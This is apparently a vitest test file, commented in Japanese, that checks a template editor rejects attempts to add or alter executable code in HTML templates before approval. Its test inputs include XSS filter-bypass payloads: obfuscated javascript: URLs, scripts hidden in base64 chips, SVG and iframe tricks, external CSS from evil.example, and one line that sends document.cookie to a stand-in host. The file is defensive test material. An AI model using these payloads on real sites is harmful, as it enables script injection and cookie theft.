// =============================================================================
// templateScripts.test.ts — テンプレ実行コード面の不変性(C0)
// =============================================================================
// テンプレの JS は正当なコンテンツで、除去してはならない。守るのは「生成時に確定した
// 実行コードが、編集・申請・承認・ペア転写のどの経路でも変わらない」ことだけである。
// よって本テストの重心は**迂回入力が拒否される**ことの主張に置き、正常系は「正当な編集を
// 誤って拒否しない」ことの回帰に絞る。承認者は実行結果しか見ないので、この照合が破れても
// 承認者は気づけない — ただし単独で承認の防壁になるわけではなく、承認画面の隔離
// (`sandbox="allow-scripts"`・same-origin なし)と対で初めて成立する。
import { isAppError } from '@editor/shared';
import { describe, expect, it } from 'vitest';
import {
  assertTemplateScriptsUnchanged,
  collectExecutableUnits,
  expandEncodedChips,
} from '../src/security/templateScripts.js';

const CTX = { templateId: 'AM01_510037_20240710_交付版', where: 'test' };

/** 不変性照合の結果を boolean で得る(AppError であることも同時に確かめる)。 */
function accepted(baseline: string, submitted: string): boolean {
  try {
    assertTemplateScriptsUnchanged(baseline, submitted, CTX);
    return true;
  } catch (e) {
    expect(isAppError(e)).toBe(true);
    return false;
  }
}

/** `data-opaque` の窓(base64 退避属性)へ任意バイト列を詰めた提出 HTML を作る。 */
const opaque = (payload: string): string =>
  `<span class="jinja-chip" data-opaque="${Buffer.from(payload, 'utf8').toString('base64')}"></span>`;

const BASE = '<html><body><script>col.width=1</script><p>本文</p></body></html>';

describe('assertTemplateScriptsUnchanged — 迂回入力の拒否', () => {
  it('実行コードが 1 文字も変わらなければ通る(唯一の正常系)', () => {
    expect(accepted(BASE, `${BASE.replace('<p>本文</p>', '<p>差し替えた本文</p>')}`)).toBe(true);
  });

  it('script を足したら拒否する', () => {
    expect(accepted(BASE, BASE.replace('</body>', '<script>fetch("/x")</script></body>'))).toBe(
      false,
    );
  });

  it('script の中身を書き換えたら拒否する', () => {
    expect(accepted(BASE, BASE.replace('col.width=1', 'col.width=1;fetch("/x")'))).toBe(false);
  });

  it('script を消しても拒否する(削除も変更である)', () => {
    expect(accepted(BASE, BASE.replace('<script>col.width=1</script>', ''))).toBe(false);
  });

  it('data-opaque の窓に script を隠しても拒否する', () => {
    // 下書き保存は requireAuth のみで任意ロールが書けるため、チップの中身は信用できない。
    // 復号した実体に対して照合していなければ、ここが素通りして承認まで到達する。
    expect(
      accepted(BASE, BASE.replace('<p>本文</p>', opaque('<script>fetch("/x")</script>'))),
    ).toBe(false);
  });

  it('基準側も復号して比較するので、同じ script をチップへ畳んだだけなら通る', () => {
    const chipped = BASE.replace(
      '<script>col.width=1</script>',
      opaque('<script>col.width=1</script>'),
    );
    expect(accepted(BASE, chipped)).toBe(true);
  });

  it('入れ子のチップに隠した script も拒否する', () => {
    const nested = opaque(opaque('<script>fetch("/x")</script>'));
    expect(accepted(BASE, BASE.replace('<p>本文</p>', nested))).toBe(false);
  });

  it('インライン event handler の追加を拒否する', () => {
    expect(accepted(BASE, BASE.replace('<p>', '<p onclick="fetch(\'/x\')">'))).toBe(false);
  });

  it('未知の on* 属性名でも拒否する(既知イベント名を数え上げない)', () => {
    expect(accepted(BASE, BASE.replace('<p>', '<p onbeforetoggle="fetch(\'/x\')">'))).toBe(false);
  });

  it('javascript: URL の追加を拒否する', () => {
    expect(accepted(BASE, BASE.replace('<p>本文</p>', '<a href="javascript:fetch(1)">x</a>'))).toBe(
      false,
    );
  });

  it('スキーム名に空白・制御文字を挟んだ javascript: も拒否する', () => {
    expect(
      accepted(BASE, BASE.replace('<p>本文</p>', '<a href="java\tscript:fetch(1)">x</a>')),
    ).toBe(false);
  });

  it('閉じタグを欠いた script も実行面として拾う', () => {
    expect(accepted(BASE, `${BASE}<script>fetch("/x")`)).toBe(false);
  });

  it('基準が空(確定も生成物も無い)なら実行コードは 1 つも持てない', () => {
    // fail-closed。基準の無い実行コードを承認へ通さない。
    expect(accepted('', '<p>本文</p>')).toBe(true);
    expect(accepted('', '<script>fetch("/x")</script>')).toBe(false);
  });

  it('script の並び順を入れ替えたら拒否する(集合ではなく順序込みで比較する)', () => {
    const two = '<script>a()</script><p>x</p><script>b()</script>';
    const swapped = '<script>b()</script><p>x</p><script>a()</script>';
    expect(accepted(two, swapped)).toBe(false);
  });
});

// 初版の抽出は script 要素 / `on*` 属性 / 生の `javascript:` の 3 形態だけを数えており、
// 以下はすべて baseline と完全一致して申請・承認の両入口を素通りした(実測)。
// 許可リスト方式へ反転した今、能動コンテンツの「別の言語機能」も単位として拾えていること。
describe('列挙型の抽出を素通りした迂回入力(回帰)', () => {
  const bypass = (injected: string): boolean =>
    accepted(BASE, BASE.replace('<p>本文</p>', injected));

  it('iframe srcdoc に実体参照で隠した script を拒否する', () => {
    expect(bypass('<iframe srcdoc="&lt;script&gt;fetch(1)&lt;/script&gt;"></iframe>')).toBe(false);
  });

  it('data:text/html を読み込む iframe を拒否する', () => {
    const doc = Buffer.from('<script>fetch(1)</script>', 'utf8').toString('base64');
    expect(bypass(`<iframe src="data:text/html;base64,${doc}"></iframe>`)).toBe(false);
  });

  it('data:text/html を読み込む object を拒否する', () => {
    expect(bypass('<object data="data:text/html,<script>fetch(1)</script>"></object>')).toBe(false);
  });

  it('&#58; で `:` を隠した javascript URL を拒否する', () => {
    expect(bypass('<a href="javascript&#58;fetch(1)">x</a>')).toBe(false);
  });

  it('SVG アニメーションで href を javascript: へ差し替える形を拒否する', () => {
    expect(bypass('<svg><animate attributeName="href" to="javascript&#58;alert(1)"/></svg>')).toBe(
      false,
    );
  });

  it('meta refresh による data:text/html への遷移を拒否する', () => {
    expect(
      bypass('<meta http-equiv="refresh" content="0;url=data:text/html,<script>x</script>">'),
    ).toBe(false);
  });

  it('style の @import による外部スタイル取り込みを拒否する', () => {
    expect(bypass('<style>@import url(https://evil.example/x.css);</style>')).toBe(false);
  });

  it('外部スタイルシートの link 追加を拒否する', () => {
    expect(bypass('<link rel="stylesheet" href="https://evil.example/x.css">')).toBe(false);
  });

  it('style 属性の url() で非画像スキームを引く形を拒否する', () => {
    expect(bypass('<div style="background:url(javascript:alert(1))">x</div>')).toBe(false);
  });

  it('タグ内 Jinja の差し替え(描画時に任意属性へ展開される)を拒否する', () => {
    const base = '<div {{ attrs }}>x</div>';
    expect(accepted(base, '<div {{ evil_attrs }}>x</div>')).toBe(false);
  });
});

// 過剰包含は「基準側にも同じだけ現れる」から誤検知にならない、が成り立つことの確認。
// ここが崩れると正当な保存が拒否され、運用側から検査ごと外される圧力になる。
describe('正当な編集を拒否しない(誤検知の回帰)', () => {
  const TPL = [
    '<!doctype html>',
    '<html lang="ja"><head><meta charset="utf-8" />',
    '<title>{{ fund.name }}</title>',
    '<link rel="stylesheet" href="css/{{ fund.code }}.css" />',
    '</head><body>',
    '<div class="page"><p class="notes">注記</p>',
    '<svg viewBox="0 0 100 50"><polyline points="0,0 10,10" stroke="#333" /></svg>',
    '<script>col.width=1</script>',
    '</body></html>',
  ].join('\n');

  it('本文・クラス・インラインスタイルの編集は通る', () => {
    const edited = TPL.replace(
      '<p class="notes">注記</p>',
      '<p class="notes lead" style="color:#333">書き直した注記</p>',
    );
    expect(accepted(TPL, edited)).toBe(true);
  });

  it('属性の並び順・引用符・自己終了スラッシュの揺れでは拒否しない', () => {
    const reserialized = TPL.replace(
      '<link rel="stylesheet" href="css/{{ fund.code }}.css" />',
      "<link href='css/{{ fund.code }}.css' rel='stylesheet'>",
    );
    expect(accepted(TPL, reserialized)).toBe(true);
  });
});

describe('collectExecutableUnits / expandEncodedChips', () => {
  it('退避属性は data-opaque 以外(data-jinja 系)も復号対象にする', () => {
    const html = `<span data-jinja="${Buffer.from('<script>x()</script>').toString('base64')}"></span>`;
    expect(expandEncodedChips(html)).toContain('<script>x()</script>');
    expect(collectExecutableUnits(html)).toHaveLength(1);
  });

  it('改行コードと前後空白の差は吸収するが中身は畳まない', () => {
    expect(collectExecutableUnits('  <script>a()</script>  ')).toEqual(
      collectExecutableUnits('<script>a()</script>'),
    );
    expect(collectExecutableUnits('<script>a( )</script>')).not.toEqual(
      collectExecutableUnits('<script>a()</script>'),
    );
  });
});

// R-再レビュー: raw text 要素の読み飛ばしが単位抽出ごと消していた穴。
// HTML の `<title>` が RCDATA なのは HTML 名前空間だけで、SVG の foreign content では
// 普通の外来要素。つまり `<svg><title><script>…` は実行されるのに単位ゼロで通っていた。
describe('raw text 読み飛ばしの迂回', () => {
  const svgBase = '<div><svg><title>zu</title></svg></div>';

  it('<svg><title> の内側に隐した script を拒否する', () => {
    const evil =
      '<div><svg><title><script>fetch("//x/"+document.cookie)</script></title></svg></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(svgBase, evil)).toBe(false);
  });

  it('<svg><title> の内側に隐した <style>@import を拒否する', () => {
    const evil = '<div><svg><title><style>@import url(http://evil/x)</style></title></svg></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(svgBase, evil)).toBe(false);
  });

  it('textarea の内側も同じく走査する', () => {
    const base = '<div><textarea>a</textarea></div>';
    const evil = '<div><textarea><script>x()</script></textarea></div>';
    expect(accepted(base, evil)).toBe(false);
  });
});

// CSS の URL 検出は `url(` を探す形だと `image-set("http://…")` で破れる。
// PDF 経路のゲート(`@editor/shared`)と同じ判定を共有していることを主張する。
describe('CSS の外部参照検出の共有', () => {
  const base = '<div><style>.a{color:red}</style></div>';

  it('image-set() の引用符文字列に置いた絶対 URL を拒否する', () => {
    const evil = '<div><style>.a{background-image:image-set("http://evil/x.png" 1x)}</style></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(base, evil)).toBe(false);
  });

  it('-webkit-image-set も同じく拒否する', () => {
    const evil =
      '<div><style>.a{background-image:-webkit-image-set("http://evil/x.png" 1x)}</style></div>';
    expect(accepted(base, evil)).toBe(false);
  });

  it('ページ番号のマージンボックスは単位を作らない(正当な CSS を拒らない)', () => {
    const css = '<div><style>@page{@bottom-center{content:counter(page)}}</style></div>';
    expect(collectExecutableUnits(css)).toEqual([]);
  });
});

// URL 属性の Jinja トークンで始まる値を無条件 inert にしていた穴。
// テンプレは描画されてから使われるので、描画後の href は `javascript:alert(1)` になる。
describe('Jinja トークンを前置した URL', () => {
  it('href="{{\'\'}}javascript:…" を拒否する', () => {
    const evil = `<a href="{{''}}javascript:alert(1)">x</a>`;
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted('<a href="/x">x</a>', evil)).toBe(false);
  });

  it('値全体が Jinja の普通の URL は単位を作らない(誤検知しない)', () => {
    expect(collectExecutableUnits('<a href="{{ fund.url }}">x</a>')).toEqual([]);
    expect(collectExecutableUnits('<img src="{{ logo }}/a.png">')).toEqual([]);
  });
});
